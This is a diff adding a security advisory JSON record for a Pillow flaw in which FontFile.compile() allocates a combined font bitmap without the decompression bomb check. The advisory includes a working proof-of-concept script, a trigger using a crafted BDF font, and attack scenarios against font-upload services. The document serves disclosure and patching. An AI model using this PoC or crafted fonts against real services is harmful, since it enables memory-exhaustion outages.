@@ -1,0 +1,171 @@
+{
+  "id": "GHSA-5x94-69rx-g8h2",
+  "modified": "2026-07-20T21:15:25.894697217Z",
+  "published": "2026-07-20T21:08:40Z",
+  "aliases": [
+    "BIT-pillow-2026-54060",
+    "CVE-2026-54060",
+    "PYSEC-2026-2254"
+  ],
+  "summary": "Pillow: `FontFile.compile()`: `Image.new()` called without `_decompression_bomb_check()`",
+  "details": "## Description\n\n`PIL/FontFile.py` `FontFile.compile()` assembles per-glyph images into a single combined bitmap using `Image.new(\"1\", (xsize, ysize))` without calling `Image._decompression_bomb_check()`. This is the base-class method shared by both `BdfFontFile` and `PcfFontFile`, and it is triggered whenever a loaded font is converted to an `ImageFont` or saved.\n\nNeither `BdfFontFile.BdfFontFile(fp)` nor `PcfFontFile.PcfFontFile(fp)` is registered with `Image.register_open()`, so Pillow's standard decompression bomb guard never fires for font objects. The compile step is the final opportunity to check the combined allocation — and it has no check.\n\n**Vulnerable code (`PIL/FontFile.py` lines ~64–92):**\n\n```python\ndef compile(self) -\u003e None:\n    if self.bitmap:\n        return\n\n    h = w = maxwidth = 0\n    lines = 1\n    for glyph in self.glyph:              # up to 256 glyph slots\n        if glyph:\n            d, dst, src, im = glyph\n            h = max(h, src[3] - src[1])   # max glyph height — attacker-controlled\n            w = w + (src[2] - src[0])\n            if w \u003e WIDTH:                  # WIDTH = 800\n                lines += 1\n                w = src[2] - src[0]\n            maxwidth = max(maxwidth, w)\n\n    xsize = maxwidth                       # ≤ 800 (capped by WIDTH constant)\n    ysize = lines * h                      # ← lines(256) × h(65535) = 16,776,960\n\n    if xsize == 0 and ysize == 0:\n        return\n\n    self.ysize = h\n    # NO _decompression_bomb_check() here ←\n    self.bitmap = Image.new(\"1\", (xsize, ysize))   # ← unchecked allocation\n```\n\n**\"Slow accumulation\" attack — per-glyph dimensions stay BELOW warning threshold:**\n\n| Metric | Per-glyph (800 × 875) | Combined bitmap (256 glyphs) |\n|---|---|---|\n| Pixel count | 700,000 | **179,200,000** |\n| DecompressionBombWarning threshold (89.4M) | 0.008× — **no warning** | 2.0× — above warning |\n| DecompressionBombError threshold (178.9M) | 0.004× — **no error** | **1.001× — above error** |\n\nWith PCF-maximum glyph height (65,535):\n\n| Metric | Value |\n|---|---|\n| lines | 256 (one per glyph slot, width=800 forces a wrap every glyph) |\n| h (max glyph height) | 65,535 |\n| xsize | 800 |\n| ysize = lines × h | 256 × 65,535 = **16,776,960** |\n| **Total pixels** | 800 × 16,776,960 = **13,421,568,000** |\n| **Ratio vs. DecompressionBombError threshold** | **75×** |\n| Memory (mode \"1\", 1 bit/pixel) | **~1.6 GB** |\n\n## Steps to reproduce\n\n**Proof of Concept script:**\n\n```python\n#!/usr/bin/env python3\n\"\"\"\nPoC: FontFile.compile() bomb bypass\n256 glyphs at 800x875 each (individually below warning threshold)\n→ compile() creates 800x224000 = 179.2M px bitmap with NO bomb check\n\"\"\"\nfrom PIL import FontFile, Image\n\nMAX_GLYPHS = 256\nGLYPH_W    = 800\nGLYPH_H    = 875     # individual: 700K px — below 89.4M warning threshold\n\nclass MockFont(FontFile.FontFile):\n    def __init__(self):\n        super().__init__()\n        # Each glyph is individually safe (700K px \u003c 89.4M warning)\n        im = Image.new(\"1\", (GLYPH_W, GLYPH_H))\n        for i in range(MAX_GLYPHS):\n            self.glyph[i] = (\n                (GLYPH_W, GLYPH_H),\n                (0, -GLYPH_H, GLYPH_W, 0),\n                (0, 0,        GLYPH_W, GLYPH_H),\n                im,\n            )\n\n# Confirm bomb check WOULD catch the combined size\ncombined_size = (GLYPH_W, MAX_GLYPHS * GLYPH_H)\ntry:\n    Image._decompression_bomb_check(combined_size)\n    print(\"[FAIL] bomb check did not raise — unexpected\")\nexcept Image.DecompressionBombError as e:\n    print(f\"[OK] bomb check WOULD block {combined_size}: {e}\")\n\n# Vulnerable path: compile() has NO bomb check\nfont = MockFont()\nfont.compile()   # → Image.new(\"1\", (800, 224000)) — no error raised\n\npx = font.bitmap.size[0] * font.bitmap.size[1]\nthreshold = Image.MAX_IMAGE_PIXELS * 2\nprint(f\"[BYPASS] compile() succeeded: bitmap={font.bitmap.size}\")\nprint(f\"         pixels={px:,}  ({px/threshold:.3f}× DecompressionBombError threshold)\")\nprint(f\"         No DecompressionBombError raised at any point.\")\n```\n\n**Expected output:**\n```\n[OK] bomb check WOULD block (800, 224000): Image size (179200000 pixels) exceeds limit\nof 178956970 pixels, could be decompression bomb DOS attack.\n[BYPASS] compile() succeeded: bitmap=(800, 224000)\n         pixels=179,200,000  (1.001× DecompressionBombError threshold)\n         No DecompressionBombError raised at any point.\n```\n\n**Verified live on Pillow 12.2.0 — compile() succeeds with no exception.**\n\n**Real-world trigger using BDF font file:**\n```python\nfrom PIL import BdfFontFile\nimport io\n\n# Load a crafted BDF font with 256 glyphs each claiming height=65535\n# (each glyph individually: 800 × 65535 = 52.4M px — below 89.4M warning)\n# compile() combined: 800 × 16,776,960 = 13.4B px — 75× error threshold\nfont = BdfFontFile.BdfFontFile(open(\"crafted_256glyph.bdf\", \"rb\"))\nfont.to_imagefont()   # → compile() → ~1.6 GB allocation, NO bomb check\n```\n\n**Attack scenarios:**\n\n| Scenario | Effect |\n|---|---|\n| Web font preview (`BdfFontFile(upload).to_imagefont()`) | DoS with crafted .bdf upload |\n| Server-side font renderer that loads PCF → `to_imagefont()` | OOM crash |\n| Font pipeline: load → render text | One malicious font file kills the process |\n\n## Impact\n\n- **Availability:** HIGH — `compile()` creates a combined bitmap whose pixel count scales as `WIDTH × lines × max_glyph_height` with no upper bound check. With max PCF glyph height (65,535) and 256 glyphs, the combined allocation is ~1.6 GB. With BDF (text-format, unbounded height), the allocation is limited only by system memory.\n- **Confidentiality:** None\n- **Integrity:** None\n\n**Affected call paths:**\n- `BdfFontFile.BdfFontFile(fp).to_imagefont()` → `FontFile.compile()`\n- `BdfFontFile.BdfFontFile(fp).save(filename)` → `FontFile.compile()`\n- `PcfFontFile.PcfFontFile(fp).to_imagefont()` → `FontFile.compile()`\n- `PcfFontFile.PcfFontFile(fp).save(filename)` → `FontFile.compile()`\n\nNeither `BdfFontFile` nor `PcfFontFile` is loaded via `Image.open()`, so the standard decompression bomb guard is **entirely absent** from the font loading code path. `compile()` is the only point where the combined allocation size is known, and it has no check.\n\nConfirmed unpatched on `python-pillow/Pillow` `main` branch as of 2026-06-08.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "pillow",
+        "purl": "pkg:pypi/pillow"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "12.3.0"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "1.0",
+        "1.1",
+        "1.2",
+        "1.3",
+        "1.4",
+        "1.5",
+        "1.6",
+        "1.7.0",
+        "1.7.1",
+        "1.7.2",
+        "1.7.3",
+        "1.7.4",
+        "1.7.5",
+        "1.7.6",
+        "1.7.7",
+        "1.7.8",
+        "10.0.0",
+        "10.0.1",
+        "10.1.0",
+        "10.2.0",
+        "10.3.0",
+        "10.4.0",
+        "11.0.0",
+        "11.1.0",
+        "11.2.1",
+        "11.3.0",
+        "12.0.0",
+        "12.1.0",
+        "12.1.1",
+        "12.2.0",
+        "2.0.0",
+        "2.1.0",
+        "2.2.0",
+        "2.2.1",
+        "2.2.2",
+        "2.3.0",
+        "2.3.1",
+        "2.3.2",
+        "2.4.0",
+        "2.5.0",
+        "2.5.1",
+        "2.5.2",
+        "2.5.3",
+        "2.6.0",
+        "2.6.1",
+        "2.6.2",
+        "2.7.0",
+        "2.8.0",
+        "2.8.1",
+        "2.8.2",
+        "2.9.0",
+        "3.0.0",
+        "3.1.0",
+        "3.1.0.rc1",
+        "3.1.0rc1",
+        "3.1.1",
+        "3.1.2",
+        "3.2.0",
+        "3.3.0",
+        "3.3.1",
+        "3.3.2",
+        "3.3.3",
+        "3.4.0",
+        "3.4.1",
+        "3.4.2",
+        "4.0.0",
+        "4.1.0",
+        "4.1.1",
+        "4.2.0",
+        "4.2.1",
+        "4.3.0",
+        "5.0.0",
+        "5.1.0",
+        "5.2.0",
+        "5.3.0",
+        "5.4.0",
+        "5.4.0.dev0",
+        "5.4.1",
+        "6.0.0",
+        "6.1.0",
+        "6.2.0",
+        "6.2.1",
+        "6.2.2",
+        "7.0.0",
+        "7.1.0",
+        "7.1.1",
+        "7.1.2",
+        "7.2.0",
+        "8.0.0",
+        "8.0.1",
+        "8.1.0",
+        "8.1.1",
+        "8.1.2",
+        "8.2.0",
+        "8.3.0",
+        "8.3.1",
+        "8.3.2",
+        "8.4.0",
+        "9.0.0",
+        "9.0.1",
+        "9.1.0",
+        "9.1.1",
+        "9.2.0",
+        "9.3.0",
+        "9.4.0",
+        "9.5.0"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-5x94-69rx-g8h2/GHSA-5x94-69rx-g8h2.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/python-pillow/Pillow/security/advisories/GHSA-5x94-69rx-g8h2"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-54060"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/python-pillow/Pillow/commit/0a263e6264aa5399988d9acd3bbfbca2ca3ec77d"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/pypa/advisory-database/tree/main/vulns/pillow/PYSEC-2026-2254.yaml"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/python-pillow/Pillow"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/python-pillow/Pillow/blob/main/docs/releasenotes/12.3.0.rst"
+    }
+  ]
+}
